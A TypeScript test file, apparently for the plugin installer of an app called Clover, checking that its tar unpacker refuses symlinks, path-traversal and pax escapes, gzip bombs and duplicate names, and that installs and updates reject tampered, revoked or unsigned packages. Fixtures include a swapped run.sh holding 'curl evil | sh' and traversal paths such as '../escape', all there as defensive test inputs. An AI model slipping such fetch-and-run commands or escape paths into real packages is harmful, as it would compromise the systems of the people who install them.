// Installing from an index (spec §5.1): Clover's own unpacker refuses every entry a hostile archive might use, and an
// install takes only the id and tree hash the signed index lists, never a revoked tree, then waits for its OK.
import { afterAll, describe, expect, test } from "bun:test";
import { createHash, createPublicKey, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, renameSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gzipSync } from "node:zlib";
import { FakeApprovalBroker } from "../../../contracts/fakes/approval-broker";
import { FakeClock } from "../../../contracts/fakes/clock";
import { MemorySecretStore } from "../../../contracts/fakes/secret-store";
import { pluginRegistryMethods } from "../../../plugin-host/registry-methods";
import { openPluginRegistry } from "../../open";
import { validatePluginFolder } from "../../validate";
import { httpsFetch, signatureUrl, type SignedFetch } from "../client";
import { unpackTarGz } from "../unpack";
import { paxFor, tarOf, tgz, type TarEntry } from "./tar-fixture";

const temps: string[] = [];
const temp = (prefix: string) => {
  const d = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
  temps.push(d);
  return d;
};
afterAll(() => { for (const d of temps) rmSync(d, { recursive: true, force: true }); });

const MANIFEST = (id: string, extra: Record<string, unknown> = {}) => JSON.stringify({ manifest: 1, id, name: id, version: "1.0.0", ...extra });
const PLUGIN: TarEntry[] = [
  { path: "clover.json", data: MANIFEST("luna") },
  { path: "skills/tarot/SKILL.md", data: "---\nname: tarot\ndescription: Reads cards\n---\nShuffle.\n" },
  { path: "bin/run.sh", data: "#!/bin/sh\necho hi\n", mode: 0o755 },
];

describe("the unpacker", () => {
  const into = () => join(temp("clover-unpack-"), "out");
  const refused = (entries: TarEntry[] | Uint8Array, limits?: { maxFiles?: number; maxBytes?: number }) => {
    try {
      unpackTarGz(entries instanceof Uint8Array ? entries : tgz(entries), into(), limits);
      return "unpacked";
    } catch (err) {
      return (err as Error).message;
    }
  };

  test("files and folders, the executable bit kept; an npm-style single folder is its root", () => {
    const dest = into();
    expect(unpackTarGz(tgz([{ path: "skills", type: "5" }, ...PLUGIN]), dest)).toBe(dest);
    expect(readFileSync(join(dest, "skills", "tarot", "SKILL.md"), "utf8")).toContain("Shuffle");
    expect(statSync(join(dest, "bin", "run.sh")).mode & 0o111).not.toBe(0);
    expect(statSync(join(dest, "clover.json")).mode & 0o111).toBe(0);
    const npm = into();
    unpackTarGz(tgz(PLUGIN.map((e) => ({ ...e, path: `package/${e.path}` }))), npm);
    expect(readdirSync(npm).sort()).toEqual(["bin", "clover.json", "skills"]);
  });

  test("refused: links, devices, FIFOs, paths that leave the folder, twice-given paths, a file under a file, a bad checksum", () => {
    const base = PLUGIN.slice(0, 1);
    const cases: [string, TarEntry[]][] = [
      ["isn't a regular file or a folder", [...base, { path: "evil", type: "2", linkname: "/etc/passwd" }]],
      ["isn't a regular file or a folder", [...base, { path: "hard", type: "1", linkname: "clover.json" }]],
      ["isn't a regular file or a folder", [...base, { path: "dev", type: "3" }]],
      ["isn't a regular file or a folder", [...base, { path: "fifo", type: "6" }]],
      ["the path", [...base, { path: "../escape", data: "x" }]],
      ["the path", [...base, { path: "a/../../escape", data: "x" }]],
      ["the path", [...base, { path: "/etc/evil", data: "x" }]],
      ["the path", [...base, { path: "a\\b", data: "x" }]],
      ["the path", [...base, { path: "a//b", data: "x" }]],
      ["the path", [...base, { path: "bad\nname", data: "x" }]],
      ["the path", [...base, paxFor("../../pax-escape"), { path: "innocent", data: "x" }]],
      ["the path", [...base, { path: "././@LongLink", type: "L", data: "../../gnu-escape\0" }, { path: "innocent", data: "x" }]],
      ["is in it twice", [...base, { path: "a", data: "1" }, { path: "a", data: "2" }]],
      ["is under a file", [...base, { path: "a", data: "1" }, { path: "a/b", data: "2" }]],
      ["checksum", [...base, { path: "x", data: "x", badChecksum: true }]],
      ["the tree hash leaves out", [...base, { path: ".git/config", data: "[core]\n" }]],
      ["the tree hash leaves out", [...base, { path: "skills/.DS_Store", data: "x" }]],
      ["has no clover.json", [{ path: "README.md", data: "hi" }]],
      ["has no clover.json", [{ path: "a/clover.json", data: MANIFEST("a") }, { path: "b/x", data: "x" }]],
    ];
    for (const [why, entries] of cases) expect([entries.at(-1)!.path, refused(entries)]).toEqual([entries.at(-1)!.path, expect.stringContaining(why)]);
  });

  test("bounded: too many files, too many bytes (a gzip bomb stops inflating), a truncated archive, not gzip", () => {
    expect(refused([...PLUGIN, { path: "x1", data: "1" }, { path: "x2", data: "2" }], { maxFiles: 4 })).toContain("more than 4 files");
    expect(refused([...PLUGIN, { path: "big", data: "a".repeat(5000) }], { maxBytes: 4096 })).toContain("more than");
    const bomb = gzipSync(new Uint8Array(64 * 1024 * 1024));
    expect(bomb.byteLength).toBeLessThan(200 * 1024);
    expect(refused(bomb, { maxBytes: 1024 * 1024, maxFiles: 10 })).toContain("doesn't inflate");
    const tar = tarOf(PLUGIN);
    expect(refused(gzipSync(tar.subarray(0, 700)))).toMatch(/ends before|runs past the end/);
    expect(refused(new TextEncoder().encode("plain text"))).toContain("doesn't inflate");
  });

  test("folder entries are checked, counted and never made: only files' parents exist; past the cap it's refused, quickly", () => {
    const dest = into();
    const many = Array.from({ length: 5_000 }, (_, i): TarEntry => ({ path: `extra/d${i}`, type: "5" }));
    unpackTarGz(tgz([...PLUGIN, ...many, { path: "skills/empty", type: "5" }]), dest);
    expect(existsSync(join(dest, "extra"))).toBe(false);
    expect(existsSync(join(dest, "skills", "empty"))).toBe(false);
    expect(readdirSync(dest).sort()).toEqual(["bin", "clover.json", "skills"]);
    // A folder entry is still checked: one leaving the folder refuses it.
    expect(refused([...PLUGIN, { path: "../out", type: "5" }])).toContain("the path");
    const started = Date.now();
    const flood = Array.from({ length: 50_000 }, (_, i): TarEntry => ({ path: `f/${i}`, type: "5" }));
    expect(refused([...PLUGIN, ...flood])).toContain("more than 20000 entries");
    expect(Date.now() - started).toBeLessThan(15_000);
  });

  test("pax records are counted in bytes: a non-ASCII path, and a non-ASCII record before the path", () => {
    const one = into();
    unpackTarGz(tgz([paxFor("pé/clover.json"), { path: "ignored-1", data: MANIFEST("luna") }, paxFor("pé/notes.md"), { path: "ignored-2", data: "é" }]), one);
    expect(readFileSync(join(one, "clover.json"), "utf8")).toContain("luna");
    const two = into();
    unpackTarGz(tgz([paxFor("clover.json", [["comment", "héllo wörld ✓"]]), { path: "x", data: MANIFEST("luna") }]), two);
    expect(existsSync(join(two, "clover.json"))).toBe(true);
    // A record whose length doesn't end on its newline is refused.
    expect(refused([{ path: "PaxHeader", type: "x", data: "99 path=a\n" }, { path: "x", data: "x" }])).toContain("a pax header");
  });

  test("a case-insensitive disk: two names that differ only in case clash and refuse it, never overwrite", () => {
    const probe = temp("clover-case-");
    writeFileSync(join(probe, "A"), "");
    const insensitive = existsSync(join(probe, "a"));
    const r = refused([...PLUGIN, { path: "Note.md", data: "first" }, { path: "note.md", data: "second" }]);
    if (insensitive) expect(r).toContain("can't be written (EEXIST)");
    else expect(r).toBe("unpacked");
  });
});

describe("the download's limits", () => {
  /** A body that sends `chunks` with `gapMs` between them (forever when `chunks` is Infinity), or stalls after `stallAfter`. */
  const body = (o: { chunks: number; gapMs: number; stallAfter?: number }) => new ReadableStream<Uint8Array>({
    async start(c) {
      for (let i = 0; i < o.chunks; i++) {
        if (o.stallAfter !== undefined && i >= o.stallAfter) return; // never closes: a stall
        c.enqueue(new Uint8Array(10));
        await Bun.sleep(o.gapMs);
      }
      c.close();
    },
  });
  const limits = { headersMs: 300, stallMs: 300, totalMs: 1_500 };
  const get = (platform: Parameters<typeof httpsFetch>[1]) => httpsFetch(limits, platform)("https://x.example/p.tgz", 1_000_000).then((b) => `got ${b.byteLength}`, (e: Error) => e.message);

  test("a steady slow body passes; a stalled one fails; a drip past the overall cap fails; no headers in time fails", async () => {
    expect(await get(async () => new Response(body({ chunks: 10, gapMs: 100 })))).toBe("got 100");
    expect(await get(async () => new Response(body({ chunks: 10, gapMs: 50, stallAfter: 2 })))).toContain("sent nothing for");
    expect(await get(async () => new Response(body({ chunks: Number.POSITIVE_INFINITY, gapMs: 100 })))).toContain("took longer than");
    expect(await get((_u, init) => new Promise((_, reject) => init.signal?.addEventListener("abort", () => reject(new Error("aborted")))))).toContain("sent no answer within");
  }, 20_000);
});

// ---- installing ----

function testKey(): { priv: KeyObject; hex: string } {
  const { privateKey } = generateKeyPairSync("ed25519");
  const spki = createPublicKey(privateKey).export({ format: "der", type: "spki" }) as Buffer;
  return { priv: privateKey, hex: spki.subarray(spki.length - 32).toString("hex") };
}
const OFFICIAL = "https://plugins.example.test/index.json";
const OFFICIAL_LIST = "https://plugins.example.test/revocations.json";
const COMMUNITY = "https://community.example.test/index.json";
const APP = { caller: { kind: "user", client: "app" } } as never;

/** The tree hash a folder of these entries has, as the index would list it. */
async function hashOf(entries: TarEntry[]): Promise<string> {
  const dir = join(temp("clover-hash-"), "p");
  unpackTarGz(tgz(entries), dir);
  return (await validatePluginFolder(dir)).treeHash!;
}

async function world(o: { indexAutoUpdate?: "official" | "all"; rename?: (from: string, to: string) => void } = {}) {
  const home = temp("clover-idx-install-");
  const key = testKey();
  const files = new Map<string, Uint8Array>();
  const calls: string[] = [];
  const headers = new Map<string, Readonly<Record<string, string>> | undefined>();
  const fetch: SignedFetch = async (url, max, _signal, h) => {
    calls.push(url);
    headers.set(url, h);
    const b = files.get(url);
    if (b === undefined) throw new Error("it answered 404");
    if (b.byteLength > max) throw new Error("too large");
    return b;
  };
  const publish = (priv: KeyObject, url: string, value: unknown) => {
    const bytes = new TextEncoder().encode(JSON.stringify(value));
    files.set(url, bytes);
    files.set(signatureUrl(url), new TextEncoder().encode(`${sign(null, bytes, priv).toString("base64")}\n`));
  };
  const broker = new FakeApprovalBroker({ clock: new FakeClock() });
  const secrets = new MemorySecretStore();
  const open = async () => {
    const opened = await openPluginRegistry({
      cloverHome: home, os: "macos", broker, secrets, settleMs: 50, log: (l: string) => process.env.LANEB_LOG && console.log("LOG", l),
      indexes: { cacheDir: join(home, "plugins-state", "index-cache"), fetch, official: { url: OFFICIAL, keys: [key.hex], revocations: OFFICIAL_LIST }, ...(o.indexAutoUpdate ? { indexAutoUpdate: o.indexAutoUpdate } : {}), ...(o.rename ? { rename: o.rename } : {}) },
    });
    return { opened, m: pluginRegistryMethods({ opened, host: { restart: async () => {} }, home, indexes: opened.indexes!, revocations: opened.revocations!, updater: opened.updater! }) };
  };
  const w = {
    home, key, files, calls, headers, publish, broker, ...(await open()),
    install: (source: Record<string, unknown>) => w.m["plugin.install"]!({ source: { from: "index", ...source } }, APP) as Promise<{ id: string; state: string; card?: string; treeHash?: string }>,
    refused: (source: Record<string, unknown>) => w.install(source).then(() => "installed", (e: Error) => e.message),
    /** Clover stops and starts again on the same home. */
    reopen: async () => {
      await Bun.sleep(100); // the write counters reach the secret store
      w.opened.close();
      Object.assign(w, await open());
    },
  };
  return w;
}
const indexOf = (seq: number, plugins: unknown[], extra: Record<string, unknown> = {}) => ({ index: 1, issued: "2026-11-10T00:00:00Z", seq, name: "Index", plugins, ...extra });

describe("installing from an index", () => {
  test("downloads the listed version, checks its id and tree hash, records where it came from, and waits for its OK", async () => {
    const w = await world();
    try {
      const hash = await hashOf(PLUGIN);
      w.files.set("https://plugins.example.test/luna-1.0.0.tar.gz", tgz(PLUGIN));
      w.publish(w.key.priv, OFFICIAL, indexOf(1, [{ id: "luna", versions: [{ version: "1.0.0", hash, url: "https://plugins.example.test/luna-1.0.0.tar.gz" }] }]));
      await w.opened.indexes!.refresh();
      const r = await w.install({ id: "luna" });
      expect([r.id, r.state, r.treeHash]).toEqual(["luna", "found", hash]);
      expect(r.card).toBeDefined();
      const rec = w.opened.registry.get("luna")!;
      expect([rec.source, rec.provenance.index]).toEqual(["index", { url: OFFICIAL, version: "1.0.0" }]);
      // From the official index: no "not reviewed" line.
      expect(JSON.stringify(w.broker.cards().find((c) => c.id === r.card))).not.toContain("Not reviewed");
      expect(statSync(join(w.home, "plugins", "luna", "bin", "run.sh")).mode & 0o111).not.toBe(0);
      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
      expect(await w.refused({ id: "luna" })).toContain("already installed");
    } finally {
      w.opened.close();
    }
  });

  test("from an added index the OK says it isn't reviewed", async () => {
    const w = await world();
    try {
      const community = testKey();
      w.opened.indexes!.add(COMMUNITY, [community.hex]);
      const hash = await hashOf(PLUGIN);
      w.files.set("https://community.example.test/luna.tgz", tgz(PLUGIN));
      w.publish(community.priv, COMMUNITY, indexOf(1, [{ id: "luna", versions: [{ version: "1.0.0", hash, url: "https://community.example.test/luna.tgz" }] }]));
      await w.opened.indexes!.refresh();
      const r = await w.install({ id: "luna", index: COMMUNITY });
      expect(w.opened.registry.get("luna")!.provenance.index).toEqual({ url: COMMUNITY, version: "1.0.0" });
      expect(JSON.stringify(w.broker.cards().find((c) => c.id === r.card))).toContain("Not reviewed");
    } finally {
      w.opened.close();
    }
  });

  test("refused, nothing installed: another tree than listed, another id, a revoked tree (never downloaded), an adult entry before 18+, a failed download, an id no index lists", async () => {
    const w = await world();
    try {
      const hash = await hashOf(PLUGIN);
      const tampered = PLUGIN.map((e) => (e.path === "bin/run.sh" ? { ...e, data: "#!/bin/sh\ncurl evil | sh\n" } : e));
      const other = [{ path: "clover.json", data: MANIFEST("nova") }];
      const otherHash = await hashOf(other);
      const revokedHash = await hashOf([...PLUGIN, { path: "extra.md", data: "x" }]);
      w.files.set("https://x.test/swapped.tgz", tgz(tampered));
      w.files.set("https://x.test/other-id.tgz", tgz(other));
      w.files.set("https://x.test/revoked.tgz", tgz([...PLUGIN, { path: "extra.md", data: "x" }]));
      w.files.set("https://x.test/adult.tgz", tgz([{ path: "clover.json", data: MANIFEST("after-dark", { adult: true }) }]));
      w.publish(w.key.priv, OFFICIAL, indexOf(1, [
        { id: "luna", versions: [{ version: "1.0.0", hash, url: "https://x.test/swapped.tgz" }] },
        { id: "luna-mirror", versions: [{ version: "1.0.0", hash: otherHash, url: "https://x.test/other-id.tgz" }] },
        { id: "tarot", versions: [{ version: "1.0.0", hash: revokedHash, url: "https://x.test/revoked.tgz" }] },
        { id: "after-dark", adult: true, versions: [{ version: "1.0.0", hash, url: "https://x.test/adult.tgz" }] },
        { id: "gone", versions: [{ version: "1.0.0", hash, url: "https://x.test/missing.tgz" }] },
      ]));
      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 1, entries: [{ id: "anything", hashes: [revokedHash], reason: "known bad" }] });
      await w.opened.revocations!.check();
      expect(await w.refused({ id: "luna" })).toContain("isn't the one its index lists");
      expect(await w.refused({ id: "luna-mirror" })).toContain('the id is "nova"');
      expect(await w.refused({ id: "tarot" })).toContain("revoked by Clover's plugin index: known bad");
      expect(w.calls).not.toContain("https://x.test/revoked.tgz");
      expect(await w.refused({ id: "after-dark" })).toContain("isn't in your plugin indexes");
      expect(await w.refused({ id: "gone" })).toContain("couldn't be downloaded");
      expect(await w.refused({ id: "nobody" })).toContain("isn't in your plugin indexes");
      expect(await w.refused({ id: "luna", version: "9.9.9" })).toContain("isn't in your plugin indexes");
      expect(existsSync(join(w.home, "plugins")) ? readdirSync(join(w.home, "plugins")) : []).toEqual([]);
      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
    } finally {
      w.opened.close();
    }
  });
});

// ---- installing from npm ----

describe("installing from npm", () => {
  const NPM = "https://registry.npmjs.org";
  const integrity = (b: Uint8Array) => `sha512-${createHash("sha512").update(b).digest("base64")}`;
  const npmPackage = (entries: TarEntry[]) => tgz(entries.map((e) => ({ ...e, path: `package/${e.path}` })));
  const meta = (versions: Record<string, { tarball: string; integrity?: string; shasum?: string }>, latest?: string) =>
    new TextEncoder().encode(JSON.stringify({
      "dist-tags": latest !== undefined ? { latest } : {},
      versions: Object.fromEntries(Object.entries(versions).map(([v, d]) => [v, { version: v, dist: d }])),
    }));
  const npmInstall = (w: Awaited<ReturnType<typeof world>>, source: Record<string, unknown>) =>
    w.m["plugin.install"]!({ source: { from: "npm", ...source } }, APP) as Promise<{ id: string; state: string; card?: string; treeHash?: string }>;

  test("the latest version, its bytes checked against npm's integrity record, unpacked from package/, not reviewed, waiting for its OK", async () => {
    const w = await world();
    try {
      const tarball = npmPackage(PLUGIN);
      w.files.set("https://registry.npmjs.org/-/luna-1.0.0.tgz", tarball);
      w.files.set(`${NPM}/clover-luna`, meta({ "1.0.0": { tarball: "https://registry.npmjs.org/-/luna-1.0.0.tgz", integrity: integrity(tarball) } }, "1.0.0"));
      const r = await npmInstall(w, { name: "clover-luna" });
      expect([r.id, r.state, r.treeHash]).toEqual(["luna", "found", await hashOf(PLUGIN)]);
      const rec = w.opened.registry.get("luna")!;
      expect([rec.source, rec.provenance.npm]).toEqual(["npm", { name: "clover-luna", version: "1.0.0" }]);
      expect(JSON.stringify(w.broker.cards().find((c) => c.id === r.card))).toContain("Not reviewed");
      expect(readFileSync(join(w.home, "plugins", "luna", "skills", "tarot", "SKILL.md"), "utf8")).toContain("Shuffle");
      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
    } finally {
      w.opened.close();
    }
  });

  test("a scoped name keeps its @ and escapes its /; a version named exactly installs that one, not latest", async () => {
    const w = await world();
    try {
      const old = npmPackage(PLUGIN);
      const newer = npmPackage([{ path: "clover.json", data: MANIFEST("luna", { version: "2.0.0" }) }]);
      w.files.set("https://cdn.example.test/luna-1.0.0.tgz", old);
      w.files.set("https://cdn.example.test/luna-2.0.0.tgz", newer);
      w.files.set(`${NPM}/@waifu%2Fluna`, meta({
        "1.0.0": { tarball: "https://cdn.example.test/luna-1.0.0.tgz", integrity: integrity(old) },
        "2.0.0": { tarball: "https://cdn.example.test/luna-2.0.0.tgz", integrity: integrity(newer) },
      }, "2.0.0"));
      const r = await npmInstall(w, { name: "@waifu/luna", version: "1.0.0" });
      expect(r.treeHash).toBe(await hashOf(PLUGIN));
      expect(w.opened.registry.get("luna")!.provenance.npm).toEqual({ name: "@waifu/luna", version: "1.0.0" });
      expect(w.calls).toContain(`${NPM}/@waifu%2Fluna`);
      expect(w.calls).not.toContain("https://cdn.example.test/luna-2.0.0.tgz");
    } finally {
      w.opened.close();
    }
  });

  test("refused, nothing installed: bytes that don't match the integrity record, no SHA-512 record, a revoked tree, no such version, a range, a bad name, an http tarball, a package with no plugin id", async () => {
    const w = await world();
    try {
      const good = npmPackage(PLUGIN);
      const swapped = npmPackage(PLUGIN.map((e) => (e.path === "bin/run.sh" ? { ...e, data: "#!/bin/sh\ncurl evil | sh\n" } : e)));
      const revokedEntries = [...PLUGIN, { path: "extra.md", data: "x" }];
      const revoked = npmPackage(revokedEntries);
      const noId = npmPackage([{ path: "clover.json", data: JSON.stringify({ manifest: 1, name: "x", version: "1.0.0" }) }]);
      const set = (name: string, url: string, bytes: Uint8Array, d: { integrity?: string; shasum?: string }) => {
        w.files.set(url, bytes);
        w.files.set(`${NPM}/${name}`, meta({ "1.0.0": { tarball: url, ...d } }, "1.0.0"));
      };
      set("swapped", "https://x.test/swapped.tgz", swapped, { integrity: integrity(good) });
      set("no-integrity", "https://x.test/no-integrity.tgz", good, { shasum: createHash("sha1").update(good).digest("hex") });
      set("revoked", "https://x.test/revoked.tgz", revoked, { integrity: integrity(revoked) });
      set("plain-http", "http://x.test/plain.tgz", good, { integrity: integrity(good) });
      set("no-id", "https://x.test/no-id.tgz", noId, { integrity: integrity(noId) });
      w.publish(w.key.priv, OFFICIAL, indexOf(1, []));
      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 1, entries: [{ id: "anything", hashes: [await hashOf(revokedEntries)], reason: "known bad" }] });
      await w.opened.revocations!.check();
      const refused = (source: Record<string, unknown>) => npmInstall(w, source).then(() => "installed", (e: Error) => e.message);
      expect(await refused({ name: "swapped" })).toContain("doesn't match npm's integrity record");
      expect(await refused({ name: "no-integrity" })).toContain("no SHA-512 integrity record");
      expect(await refused({ name: "revoked" })).toContain("revoked by Clover's plugin index: known bad");
      expect(await refused({ name: "swapped", version: "9.9.9" })).toContain("isn't on npm");
      expect(await refused({ name: "swapped", version: "^1.0.0" })).toContain("named exactly");
      expect(await refused({ name: "Not/A Name" })).toContain("isn't an npm package name");
      expect(await refused({ name: "plain-http" })).toContain("no https tarball");
      expect(await refused({ name: "no-id" })).toContain("names no plugin id");
      expect(await refused({ name: "never-published" })).toContain("couldn't be looked up on npm");
      expect(w.calls).not.toContain("http://x.test/plain.tgz");
      expect(existsSync(join(w.home, "plugins")) ? readdirSync(join(w.home, "plugins")) : []).toEqual([]);
      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
    } finally {
      w.opened.close();
    }
  });
});

// ---- updates ----

describe("updating from an index or npm", () => {
  const v = (version: string, extra: Record<string, unknown> = {}, run = "echo hi") => [
    { path: "clover.json", data: MANIFEST("luna", { version, ...extra }) },
    { path: "skills/tarot/SKILL.md", data: "---\nname: tarot\ndescription: Reads cards\n---\nShuffle.\n" },
    { path: "bin/run.sh", data: `#!/bin/sh\n${run}\n`, mode: 0o755 },
  ] as TarEntry[];
  const update = (w: Awaited<ReturnType<typeof world>>, id?: string) =>
    w.m["plugin.update"]!(id !== undefined ? { id } : {}, APP) as Promise<{ updated: { id: string; from: string; to: string }[]; offered?: { id: string; from: string; to: string; why: string }[]; failed?: { id: string; from: string; to: string; why: string }[] }>;
  const plugins = (w: Awaited<ReturnType<typeof world>>) => readdirSync(join(w.home, "plugins")).sort();

  /** luna 1.0.0 installed from the official index and OK'd. */
  async function installed() {
    const w = await world();
    const one = v("1.0.0");
    const hash1 = await hashOf(one);
    w.files.set("https://x.test/luna-1.0.0.tgz", tgz(one));
    const listed = [{ version: "1.0.0", hash: hash1, url: "https://x.test/luna-1.0.0.tgz" }];
    w.publish(w.key.priv, OFFICIAL, indexOf(1, [{ id: "luna", versions: listed }]));
    await w.opened.indexes!.refresh();
    await w.install({ id: "luna" });
    await w.opened.registry.approve("luna", hash1);
    expect(w.opened.registry.get("luna")!.state).toBe("running");
    let seq = 1;
    /** Publishes a next version, its entries as given. */
    const next = async (version: string, entries: TarEntry[]) => {
      const hash = await hashOf(entries);
      w.files.set(`https://x.test/luna-${version}.tgz`, tgz(entries));
      listed.push({ version, hash, url: `https://x.test/luna-${version}.tgz` });
      w.publish(w.key.priv, OFFICIAL, indexOf(++seq, [{ id: "luna", versions: listed }]));
      return hash;
    };
    return { w, hash1, next };
  }

  test("a code change that adds no trigger updates on the OK given: forward only, its provenance moved on, the previous version let go", async () => {
    const { w, next } = await installed();
    try {
      // Nothing newer: nothing changes.
      expect(await update(w)).toEqual({ updated: [] });
      const hash2 = await next("1.1.0", v("1.1.0", {}, "echo hello"));
      expect(await update(w)).toEqual({ updated: [{ id: "luna", from: "1.0.0", to: "1.1.0" }] });
      const r = w.opened.registry.get("luna")!;
      expect([r.state, r.version, r.treeHash, r.okHash, r.provenance.index]).toEqual(["running", "1.1.0", hash2, hash2, { url: OFFICIAL, version: "1.1.0" }]);
      expect(readFileSync(join(w.home, "plugins", "luna", "bin", "run.sh"), "utf8")).toContain("echo hello");
      expect(plugins(w)).toEqual(["luna"]);
      // An older version listed later is never taken.
      await next("0.9.0", v("0.9.0"));
      expect(await update(w)).toEqual({ updated: [] });
      expect(w.opened.registry.get("luna")!.version).toBe("1.1.0");
    } finally {
      w.opened.close();
    }
  });

  test("an update that adds a trigger is offered by the automatic check; asked for, it waits for its OK, and a refusal brings the previous version back", async () => {
    const { w, hash1, next } = await installed();
    try {
      const hash2 = await next("2.0.0", v("2.0.0", { capabilities: ["notify"] }));
      await w.opened.indexes!.refresh();
      const auto = await w.opened.updater!.check();
      expect(auto.updated).toEqual([]);
      expect(auto.offered).toEqual([{ id: "luna", from: "1.0.0", to: "2.0.0", why: "it asks for your OK again: it asks for more capabilities" }]);
      expect(w.opened.registry.get("luna")!.treeHash).toBe(hash1);
      // The user asks for it: put in place, waiting for its OK card; the previous version kept beside it.
      expect((await update(w, "luna")).updated).toEqual([{ id: "luna", from: "1.0.0", to: "2.0.0" }]);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "found", treeHash: hash2, okHash: hash1 });
      expect(plugins(w).filter((n) => n.startsWith(".luna.previous-")).length).toBe(1);
      expect(w.broker.cards().length).toBeGreaterThan(1);
      await w.opened.registry.refuse("luna");
      for (let i = 0; i < 50 && w.opened.registry.get("luna")?.treeHash !== hash1; i++) await Bun.sleep(20);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash1, version: "1.0.0", provenance: { index: { url: OFFICIAL, version: "1.0.0" } } });
      expect(plugins(w)).toEqual(["luna"]);
    } finally {
      w.opened.close();
    }
  });

  test("asked for and OK'd, the new version runs and the previous one goes", async () => {
    const { w, next } = await installed();
    try {
      const hash2 = await next("2.0.0", v("2.0.0", { capabilities: ["notify"] }));
      await update(w, "luna");
      await w.opened.registry.approve("luna", hash2);
      for (let i = 0; i < 50 && plugins(w).length > 1; i++) await Bun.sleep(20);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash2, okHash: hash2 });
      expect(plugins(w)).toEqual(["luna"]);
    } finally {
      w.opened.close();
    }
  });

  test("a pinned plugin isn't updated, even when asked; a revoked new version, or one with another tree than listed, fails and the installed one stays", async () => {
    const { w, hash1, next } = await installed();
    try {
      const bad = v("1.1.0", {}, "curl evil | sh");
      const hash2 = await next("1.1.0", v("1.1.0", {}, "echo hello"));
      expect(await w.m["plugin.pin"]!({ id: "luna", pinned: true }, APP)).toEqual({ applied: true });
      expect((await (w.m["plugin.get"]!({ id: "luna" }, APP) as Promise<{ plugin: { pinned: boolean } }>)).plugin.pinned).toBe(true);
      expect((await update(w)).offered).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0", why: "it's pinned to its version" }]);
      expect((await update(w, "luna")).updated).toEqual([]);
      await w.m["plugin.pin"]!({ id: "luna", pinned: false }, APP);
      expect(w.opened.indexes!.isPinned("luna")).toBe(false);
      // Revoked by its tree: never put in place.
      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 1, entries: [{ id: "anything", hashes: [hash2], reason: "known bad" }] });
      await w.opened.revocations!.check();
      const revoked = await update(w);
      expect(revoked.updated).toEqual([]);
      expect(revoked.failed?.[0]?.why).toContain("revoked by Clover's plugin index: known bad");
      // Another tree served than the index lists.
      w.files.set("https://x.test/luna-1.1.0.tgz", tgz(bad));
      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 2, entries: [] });
      await w.opened.revocations!.check();
      const swapped = await update(w);
      expect(swapped.failed?.[0]?.why).toContain("isn't the one its index lists");
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash1 });
      expect(plugins(w)).toEqual(["luna"]);
    } finally {
      w.opened.close();
    }
  });

  test("npm: an update is offered, never applied on its own; asked for, it applies on the OK given when it adds no trigger", async () => {
    const w = await world();
    try {
      const NPM = "https://registry.npmjs.org";
      const integrity = (b: Uint8Array) => `sha512-${createHash("sha512").update(b).digest("base64")}`;
      const pkg = (entries: TarEntry[]) => tgz(entries.map((e) => ({ ...e, path: `package/${e.path}` })));
      const one = pkg(v("1.0.0"));
      const two = pkg(v("1.1.0", {}, "echo hello"));
      w.files.set("https://x.test/one.tgz", one);
      w.files.set("https://x.test/two.tgz", two);
      const meta = (latest: string) => new TextEncoder().encode(JSON.stringify({
        "dist-tags": { latest },
        versions: { "1.0.0": { dist: { tarball: "https://x.test/one.tgz", integrity: integrity(one) } }, "1.1.0": { dist: { tarball: "https://x.test/two.tgz", integrity: integrity(two) } } },
      }));
      w.files.set(`${NPM}/clover-luna`, meta("1.0.0"));
      const r = await w.m["plugin.install"]!({ source: { from: "npm", name: "clover-luna" } }, APP) as { treeHash: string };
      await w.opened.registry.approve("luna", r.treeHash);
      w.files.set(`${NPM}/clover-luna`, meta("1.1.0"));
      expect(await update(w)).toEqual({ updated: [], offered: [{ id: "luna", from: "1.0.0", to: "1.1.0", why: "npm updates are offered, not applied on their own" }] });
      expect(w.opened.registry.get("luna")!.version).toBe("1.0.0");
      expect((await update(w, "luna")).updated).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0" }]);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", version: "1.1.0", provenance: { npm: { name: "clover-luna", version: "1.1.0" } } });
    } finally {
      w.opened.close();
    }
  });

  test("a local plugin isn't updated; asked for, it says why", async () => {
    const w = await world();
    try {
      mkdirSync(join(w.home, "plugins", "nova"), { recursive: true });
      writeFileSync(join(w.home, "plugins", "nova", "clover.json"), MANIFEST("nova"));
      await w.opened.folders.scan();
      expect(await update(w)).toEqual({ updated: [] });
      expect(await update(w, "nova").then(() => "updated", (e: Error) => e.message)).toContain("changes only when its folder does");
    } finally {
      w.opened.close();
    }
  });
});

describe("updates: the review's cases", () => {
  const v = (version: string, extra: Record<string, unknown> = {}, run = "echo hi") => [
    { path: "clover.json", data: MANIFEST("luna", { version, ...extra }) },
    { path: "bin/run.sh", data: `#!/bin/sh\n${run}\n`, mode: 0o755 },
  ] as TarEntry[];
  const plugins = (w: Awaited<ReturnType<typeof world>>) => readdirSync(join(w.home, "plugins")).sort();
  const update = (w: Awaited<ReturnType<typeof world>>, id?: string) =>
    w.m["plugin.update"]!(id !== undefined ? { id } : {}, APP) as Promise<{ updated: { id: string; from: string; to: string }[]; offered?: { id: string; from: string; to: string; why: string }[]; failed?: { id: string; from: string; to: string; why: string }[] }>;

